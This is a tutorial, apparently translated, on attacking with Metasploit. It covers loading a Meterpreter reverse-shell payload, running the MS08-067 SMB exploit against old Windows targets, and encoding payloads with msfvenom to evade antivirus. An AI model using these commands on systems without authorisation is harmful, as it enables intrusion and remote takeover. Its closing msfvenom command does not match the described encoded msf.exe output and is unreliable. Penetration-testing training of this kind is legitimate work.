    ## Performing an Attack using Metasploit


    ### Perform an attack

    After the user finds a penetration test module that can exploit the vulnerability,
    the attack can be carried out. To perform further attacks, users can also load
    the attack payload. Then, configure the attack payload and implement the attack.


    ### Loading the attack payload

    The attack payload is the aforementioned `Payload`. By loading payloads, further
    attacks can be achieved, such as obtaining Shell and remotely executing commands.
    The following will introduce the method of loading the attack payload.

    The syntax format for loading the attack payload is as follows:

    ```

    set payload

    ```

    In the above syntax, `payload` name represents the name of the attack payload.
    Load the attack payload for the `webtest` penetration test module imported above
    is shown. The specific steps are as follows:


    1. **Start and select the `webtest` penetration test module.**

    The execution command is as follows:

    ```

    root@exampleserver:～# msfconsole

    msf5> use exploit/test/webtest

    msf5 exploit(test/webtest)>

    ```


    2. **View the payload that can be loaded.**

    The execution command is as follows:

    ```

    msf5 exploit(test/webtest)> show payloads

    ```

    As can be seen from the output information, all available payloads of the current
    penetration test module are displayed. The output information shows 6 columns
    of information, which respectively indicate `#` (Payload number), `Name` (name),
    `Disclosure Date` (release date), `Rank` (level), `Check` (support) and `Description`.


    3. **Load the attack payload.**

    The execution command is as follows:

    ```

    msf5 exploit(test/webtest)> set payload windows/x64/meterpreter/reverse_tcp

    payload => windows/x64/meterpreter/reverse_tcp

    ```

    From the output information, we can see that an attack payload named `windows/x64/meterpreter/reverse_tcp`
    is loaded.


    ### Configure the attack payload

    After the user loads the attack payload, it also needs to be configured and set
    the parameters that need to be configured. The following will describe how to
    configure the attack payload. We will take `php/exec` as an example.


    1. **Use the `show options` command to view the configurable options.**

    The execution command is as follows:

    ```

    msf5 exploit(test/webtest)> show options

    ```

    From the output information, we can see all the configuration options. At this
    point, the user can set these options.


    2. **Set the `CMD` option of the attack payload.**

    The execution command is as follows:

    ```

    msf5 exploit(test/webtest)> set CMD dir

    CMD => dir

    ```

    It can be seen from the output information that the `CMD` value of `Payload` option
    has been set to `dir`.


    3. **Implement an attack.**

    The execution command is as follows:

    ```

    msf5 exploit(test/webtest)> exploit

    ```


    ### Setting up the architecture

    Some penetration testing modules may support system architectures. Under normal
    circumstances, penetration testing modules that support system architectures are
    automatically by default. When the user initiates an attack, the penetration test
    module will automatically select the target based on the detected target. If the
    user obtains the architecture of the target host through other means, he can manually
    set the architecture to improve the efficiency of penetration testing. The following
    will introduce the method of setting up the architecture. The following will take
    the `MS08_067` module as an example.

    The specific steps are as follows:


    1. **Select the `MS08_067` vulnerability module and view the module options.**

    The execution command is as follows:

    ```

    msf5> use exploit/windows/smb/ms08_067_netapi

    msf5 exploit(windows/smb/ms08_067_netapi)> show options

    ```


    2. **Check the available target architecture.**

    The execution command is as follows:

    ```

    msf5 exploit(windows/smb/ms08_067_netapi)> show targets

    ```

    From the output information, you can see all the target architectures supported
    by the module. There are two columns in the output information, representing `Id`
    (number) and `Name` (target name). By analyzing the output results, it can be
    known that the architecture supported by the module includes Windows 2000 Universal,
    Windows XP SP0/SP1 Universal, and Windows 2003 SP0 Universal. Next, users can
    set according to their target architecture. Among them, the syntax format of setting
    the architecture is as follows:

    ```

    set target [id]

    ```

    In the above syntax, the parameter `id` refers to the supported architecture number.


    3. **Set the target architecture to Windows XP SP0/SP1 Universal.**

    The execution command is as follows:

    ```

    msf5 exploit(windows/smb/ms08_067_netapi)> set target 2

    target => 2

    ```

    From the output information, we can see that the target architecture number has
    been successfully set to 2. At this point, the user can view the options of the
    module again, and it is determined that the target architecture is set successfully.
    as follows:

    ```

    msf5 exploit(windows/smb/ms08_067_netapi)> show options

    ```

    From the output information, we can see that the target system architecture is
    successfully set to Windows XP SP0/SP1 Universal.


    ### Set encoding

    In order to avoid the appearance of bad characters, or to avoid the interception
    of the firewall or anti-virus software in the target host, you can set the code
    for the attack load to generate a new attack load. Among them, the encoding module
    is mainly used by the `msfvenom` tool. `msfvenom` is an attack load generator
    supporting the MSF framework. Among them, the syntax format used to generate the
    attack payload is as follows:

    ```

    msfvenom [options]<var=val>

    ```

    Use the `x86/shikata_ga_nai` encoding to generate a new attack payload and save
    it to `msf`. Methods as below:


    1. **View all supported codes.**

    The execution command is as follows:

    ```

    root@exampleserver:# msfvenom -l encoders

    ```


    2. **Create attack payload.**

    The execution command is as follows:

    ```

    root@exampleserver:# ./msfvenom -p windows/meterpreter/bind_tcp RHOST=192.168.29.134

    ```

    From the information output above, we can see that an attack payload was created
    using `x86/shikata_ga_nai` encoding. Among them, the attack payload file is `msf.exe`.


